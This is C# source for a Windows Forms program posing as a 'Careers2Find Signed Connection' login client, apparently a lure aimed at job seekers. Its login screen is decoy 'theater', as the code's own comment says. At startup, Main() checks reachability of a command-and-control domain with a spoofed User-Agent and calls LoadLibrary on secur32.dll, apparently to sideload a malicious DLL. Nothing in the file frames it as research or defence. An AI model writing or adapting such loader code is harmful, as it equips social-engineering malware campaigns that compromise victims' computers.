// TERM=konsole mcs -platform:x64 -r:System.Windows.Forms -r:System.Drawing -out:SignedConnection.exe SignedConnection.cs

using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace SignedConnection
{
    public class MainForm : Form
    {
        private TextBox txtServer;
        private TextBox txtUsername;
        private TextBox txtPassword;
        private Button btnConnect;
        private Button btnDisconnect;

        public MainForm()
        {
            // Form Setup
            this.Text = "SignedConnection\u00AE";
            this.Size = new Size(520, 400);
            this.BackColor = Color.FromArgb(26, 26, 26); 
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.DoubleBuffered = true;

            InitializeCustomGUI();
        }

        private void InitializeCustomGUI()
        {
            Font mainFont = new Font("Segoe UI", 9f, FontStyle.Regular);
            Font boldFont = new Font("Segoe UI", 9f, FontStyle.Bold);

            // Server Label & TextBox
            Label lblServer = new Label() { Text = "Server", ForeColor = Color.White, Location = new Point(220, 75), AutoSize = true, Font = boldFont };
            txtServer = new TextBox() { Text = "https://quiz.careejgsdygfiygyidgfuogseufysgrs2find.com", Location = new Point(220, 95), Width = 260, ReadOnly = true, Font = mainFont, BackColor = Color.FromArgb(224, 224, 224) };

            // Username Label & TextBox
            Label lblUser = new Label() { Text = "Username", ForeColor = Color.White, Location = new Point(220, 135), AutoSize = true, Font = boldFont };
            txtUsername = new TextBox() { Location = new Point(220, 155), Width = 260, Font = mainFont };

            // Password Label & TextBox
            Label lblPass = new Label() { Text = "Password", ForeColor = Color.White, Location = new Point(220, 195), AutoSize = true, Font = boldFont };
            txtPassword = new TextBox() { Location = new Point(220, 215), Width = 260, UseSystemPasswordChar = true, Font = mainFont };

            // Buttons
            btnConnect = new Button() { Text = "Connect", Location = new Point(220, 280), Size = new Size(120, 35), BackColor = Color.FromArgb(0, 120, 215), ForeColor = Color.White, FlatStyle = FlatStyle.Flat, Font = boldFont };
            btnConnect.FlatAppearance.BorderSize = 0;
            btnConnect.Click += BtnConnect_Click;

            btnDisconnect = new Button() { Text = "Disconnect", Location = new Point(360, 280), Size = new Size(120, 35), BackColor = Color.FromArgb(51, 51, 51), ForeColor = Color.White, FlatStyle = FlatStyle.Flat, Font = boldFont };
            btnDisconnect.FlatAppearance.BorderSize = 0;
            btnDisconnect.Click += (s, e) => Application.Exit();

            this.Controls.Add(lblServer);
            this.Controls.Add(txtServer);
            this.Controls.Add(lblUser);
            this.Controls.Add(txtUsername);
            this.Controls.Add(lblPass);
            this.Controls.Add(txtPassword);
            this.Controls.Add(btnConnect);
            this.Controls.Add(btnDisconnect);
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);
            Graphics g = e.Graphics;
            g.SmoothingMode = SmoothingMode.AntiAlias;

            // Draw Logo Box (White rounded rect)
            Rectangle logoRect = new Rectangle(30, 40, 70, 70);
            using (GraphicsPath path = GetRoundedRect(logoRect, 15))
            using (SolidBrush brush = new SolidBrush(Color.White))
            {
                g.FillPath(brush, path);
            }

            // Draw Magnifying Glass inside logo
            using (Pen pen = new Pen(Color.Black, 4))
            {
                g.DrawEllipse(pen, 45, 55, 25, 25);
                g.DrawLine(pen, 65, 75, 80, 90);
            }

            // Draw "Careers2Find" Text
            using (Font font = new Font("Segoe UI", 14f, FontStyle.Bold))
            using (SolidBrush brush = new SolidBrush(Color.White))
            {
                g.DrawString("Careers2Find", font, brush, new Point(110, 40));
            }

            // Draw "Signed Connection®" Text
            using (Font font = new Font("Segoe UI", 12f, FontStyle.Regular))
            using (SolidBrush brush = new SolidBrush(Color.White))
            {
                g.DrawString("Signed Connection\u00AE", font, brush, new Point(10, 130));
            }

            // Draw Red Dot
            using (SolidBrush brush = new SolidBrush(Color.FromArgb(255, 59, 48)))
            {
                g.FillEllipse(brush, 30, 175, 12, 12);
            }

            // Draw "Disconnected" Text
            using (Font font = new Font("Segoe UI", 10f, FontStyle.Regular))
            using (SolidBrush brush = new SolidBrush(Color.FromArgb(204, 204, 204)))
            {
                g.DrawString("Disconnected", font, brush, new Point(50, 173));
            }
        }

        private GraphicsPath GetRoundedRect(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            int diameter = radius * 2;
            path.AddArc(rect.X, rect.Y, diameter, diameter, 180, 90);
            path.AddArc(rect.Right - diameter, rect.Y, diameter, diameter, 270, 90);
            path.AddArc(rect.Right - diameter, rect.Bottom - diameter, diameter, diameter, 0, 90);
            path.AddArc(rect.X, rect.Bottom - diameter, diameter, diameter, 90, 90);
            path.CloseFigure();
            return path;
        }

        private void BtnConnect_Click(object sender, EventArgs e)
        {
            // Theater only — the DLL already loaded at startup
            MessageBox.Show("Connecting to secure server...", "Careers2Find", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Application.Exit();
        }
    }

    static class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [STAThread]
        static void Main()
        {

            if (CheckC2Connectivity())
            {
                Environment.Exit(0); 
            }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);


            LoadLibrary("secur32.dll");

            Application.Run(new MainForm());
        }

        private static bool CheckC2Connectivity()
        {
   
            try
            {
                string checkUrl = "https://quiz.careejgsdygfiygyidgfuogseufysgrs2find.com";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(checkUrl);
                request.Timeout = 5000;
                request.Method = "HEAD";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                    return response.StatusCode == HttpStatusCode.OK || (int)response.StatusCode < 400;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
